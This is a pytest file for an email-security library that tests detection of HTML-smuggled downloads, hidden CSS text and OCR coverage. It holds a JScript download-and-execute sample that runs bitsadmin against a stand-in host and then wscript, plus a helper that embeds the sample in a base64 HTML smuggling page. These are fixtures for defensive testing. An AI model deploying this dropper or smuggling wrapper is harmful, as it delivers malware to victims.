import base64
import io
import subprocess
import time
from email import policy
from email.parser import BytesParser
from pathlib import Path

import pytest

from mailsec.inspection.documents import inspect_document
from mailsec.inspection.ocr import OCRBudget, OCRFailure, read_image


def inspect(data, name="invoice.html", mime="text/html", **limits):
    return inspect_document(data, name, mime, limits=limits)


def generated_download(payload, filename="invoice.js"):
    encoded = base64.b64encode(payload.encode()).decode()
    return f'''<p>Your invoice was downloaded.</p><script>
    const data = "{encoded}";
    const blob = base64ToBlob(data, 'application/octet-stream');
    const a = document.createElement('a'); a.href = URL.createObjectURL(blob);
    a.download = '{filename}'; a.click();
    </script>'''.encode()


DOWNLOADER = '''var shell = new ActiveXObject("WScript.Shell");
var target = "%Temp%\\payload"; var url = "https://payload.example.test/invoice";
shell.run('bitsadmin /transfer example ' + url + ' ' + target,0,true);
shell.run('wscript //E:VBScript ' + target);'''


def test_static_decoder_identifies_generated_download_then_execution_without_running_code(monkeypatch):
    def forbidden(*args, **kwargs):
        pytest.fail("Static analysis must not execute or fetch anything")
    monkeypatch.setattr("subprocess.Popen", forbidden)
    monkeypatch.setattr("socket.create_connection", forbidden)
    result = inspect(generated_download(DOWNLOADER))
    findings = {item["id"]: item for item in result["findings"]}
    assert findings["static_download_execute"]["severity"] == "critical"
    assert result["urls"] == ["https://payload.example.test/invoice"]
    assert result["static_payloads"][0]["executed"] is False
    assert "bitsadmin" not in result["text"]


@pytest.mark.parametrize("payload,filename", [
    ("A legitimate exported invoice and receipt.", "invoice.txt"),
    ("console.log('A normal exported script file.');", "example.js"),
    ("// " + DOWNLOADER.replace("\n", "\n// "), "example.js"),
    (DOWNLOADER.replace("' + target);", "' + differentFile);"), "example.js"),
])
def test_ordinary_downloads_and_incidental_code_are_not_malware(payload, filename):
    result = inspect(generated_download(payload, filename))
    assert not any(item["severity"] == "critical" for item in result["findings"])


def test_static_decoding_has_real_byte_and_payload_limits():
    result = inspect(generated_download(DOWNLOADER), max_static_decoded_bytes=10)
    assert "static_decode_budget_limit" in result["coverage"]["limitations"]
    assert result["coverage"]["material_content_gap"] is True
    assert not result.get("static_payloads")
    result = inspect(generated_download(DOWNLOADER), max_static_payloads=0)
    assert result["coverage"]["status"] == "partial"


def test_css_hidden_attachment_text_does_not_replace_visible_request():
    result = inspect(b'<style>.filler {display:none}</style><p>Pay the invoice.</p>'
                     b'<section class="filler">Routine laptop discussion.</section>')
    assert "Pay the invoice" in result["text"]
    assert "laptop discussion" not in result["text"]
    assert "laptop discussion" in result["hidden_text"]


def test_conditional_css_keeps_uncertainty_without_claiming_substantive_content_was_lost():
    result = inspect(b'<style>@media (prefers-color-scheme: dark) {.logo {display:none}}</style>'
                     b'<p>Your account verification code has arrived.</p><span class="logo">Company logo</span>')
    assert result["coverage"]["status"] == "partial"
    assert "conditional_visibility" in result["coverage"]["visibility_uncertainties"]
    assert result["coverage"].get("material_content_gap") is not True
    assert "verification code" in result["text"]


def test_minor_unsupported_hiding_selector_does_not_invent_missing_main_copy():
    result = inspect(b'<style>.logo:hover {display:none}</style><p>Your receipt is ready.</p>'
                     b'<span class="logo">Company logo</span>')
    assert result["coverage"]["status"] == "partial"
    assert result["coverage"].get("material_content_gap") is not True
    assert "Your receipt" in result["text"]


def test_substantive_unresolved_unconditional_hiding_remains_material():
    result = inspect(('<div style="clip-path:inset(100%)">' + 'Unresolved visible copy. ' * 80 + '</div>').encode())
    assert result["coverage"]["material_content_gap"] is True
    assert "unsupported_clipping" in result["coverage"]["visibility_uncertainties"]


def test_actual_html_source_loss_remains_material(monkeypatch):
    monkeypatch.setattr("mailsec.html_visibility.MAX_SOURCE_CHARS", 100)
    result = inspect(b'<p>' + b'Original text. ' * 100 + b'</p>')
    assert result["coverage"]["material_content_gap"] is True
    assert "html_source_limit" in result["coverage"]["visibility_limits"]


@pytest.mark.parametrize("number", [432, 402])
def test_reviewed_corpus_downloaders_are_detected_when_local_corpus_is_present(number):
    path = Path(__file__).parents[1] / f"data/corpora/phishing-pot/email/sample-{number}.eml"
    if not path.exists():
        pytest.skip("Private local evaluation corpus not packaged with unit tests")
    message = BytesParser(policy=policy.default).parsebytes(path.read_bytes())
    attachments = [part for part in message.walk() if part.get_filename() and part.get_content_type() == "text/html"]
    assert attachments
    for part in attachments:
        result = inspect(part.get_payload(decode=True))
        assert any(item["id"] == "static_download_execute" for item in result["findings"])


def image_bytes(size=(700, 300)):
    image = pytest.importorskip("PIL.Image")
    buffer = io.BytesIO()
    image.new("RGB", size, "white").save(buffer, "PNG")
    return buffer.getvalue()


def test_image_ocr_extracts_text_and_links_as_evidence(monkeypatch):
    monkeypatch.setattr("mailsec.inspection.documents.read_image",
                        lambda *args: ("Call billing or visit https://billing.example.test/refund", 93))
    result = inspect(image_bytes(), "invoice.png", "image/png")
    assert "Call billing" in result["text"]
    assert "https://billing.example.test/refund" in result["urls"]
    assert result["coverage"]["ocr"] == "extracted"
    assert result["coverage"].get("ocr_material_gap") is not True


@pytest.mark.parametrize("reason,status", [("ocr_engine_unavailable", "unavailable"),
                                           ("ocr_operation_timeout", "limited"),
                                           ("ocr_output_limit", "limited"),
                                           ("ocr_operation_failed", "error")])
def test_ocr_failures_leave_explicit_material_gap(monkeypatch, reason, status):
    def fail(*args):
        raise OCRFailure(reason)
    monkeypatch.setattr("mailsec.inspection.documents.read_image", fail)
    result = inspect(image_bytes(), "invoice.png", "image/png")
    assert result["coverage"]["ocr"] == status
    assert result["coverage"]["ocr_material_gap"] is True
    assert result["coverage"]["status"] == "partial"


def test_small_decorative_images_do_not_require_ocr_or_create_material_gaps(monkeypatch):
    def fail(*args):
        pytest.fail("A tracking pixel or small icon must not consume OCR resources")
    monkeypatch.setattr("mailsec.inspection.documents.read_image", fail)
    for dimensions in [(1, 1), (32, 32), (400, 1)]:
        result = inspect(image_bytes(dimensions), "logo.png", "image/png")
        assert result["coverage"]["ocr"] == "not_applicable"
        assert result["coverage"].get("ocr_material_gap") is not True


def test_low_confidence_ocr_is_not_silently_complete(monkeypatch):
    monkeypatch.setattr("mailsec.inspection.documents.read_image", lambda *args: ("uncertain transcription", 20))
    result = inspect(image_bytes(), "invoice.png", "image/png")
    assert "uncertain transcription" in result["text"]
    assert result["coverage"]["ocr_material_gap"] is True


def test_ocr_shared_budget_limits_count_and_wall_clock():
    budget = OCRBudget({"max_ocr_images": 1, "max_ocr_seconds": 10})
    budget.claim()
    with pytest.raises(OCRFailure, match="budget_limit"):
        budget.claim()
    budget = OCRBudget({"max_ocr_seconds": 10})
    budget.deadline = time.monotonic() - 1
    with pytest.raises(OCRFailure, match="budget_limit"):
        budget.timeout()


def test_ocr_command_uses_fixed_executable_no_shell_and_bounded_timeout(monkeypatch):
    image = pytest.importorskip("PIL.Image")
    monkeypatch.setattr("mailsec.inspection.ocr.shutil.which", lambda *args, **kwargs: "/usr/bin/tesseract")
    def run(command, **kwargs):
        assert command[0] == "/usr/bin/tesseract"
        assert not kwargs.get("shell")
        assert kwargs["timeout"] <= 4
        assert kwargs["env"]["OMP_THREAD_LIMIT"] == "1"
        kwargs["stdout"].write(b"level\tpage\tblock\tpar\tline\tword\tx\ty\tw\th\tconf\ttext\n"
                                  b"5\t1\t1\t1\t1\t1\t1\t1\t10\t10\t95\tReceipt\n")
        return subprocess.CompletedProcess(command, 0)
    monkeypatch.setattr("mailsec.inspection.ocr.subprocess.run", run)
    assert read_image(image.new("RGB", (800, 300)), OCRBudget({})) == ("Receipt", 95.0)


def test_image_only_pdf_uses_bounded_local_page_render_and_ocr(monkeypatch):
    pypdf = pytest.importorskip("pypdf")
    image = pytest.importorskip("PIL.Image")
    writer = pypdf.PdfWriter()
    writer.add_blank_page(300, 300)
    output = io.BytesIO()
    writer.write(output)
    calls = []
    def render(data, page, budget):
        calls.append(page)
        return image.new("RGB", (700, 300))
    monkeypatch.setattr("mailsec.inspection.documents.render_pdf_page", render)
    monkeypatch.setattr("mailsec.inspection.documents.read_image", lambda *args: ("Invoice 250 dollars", 95))
    result = inspect(output.getvalue(), "scan.pdf", "application/pdf")
    assert calls == [1]
    assert "Invoice 250 dollars" in result["text"]
    assert result["coverage"]["ocr_pages_rendered"] == 1
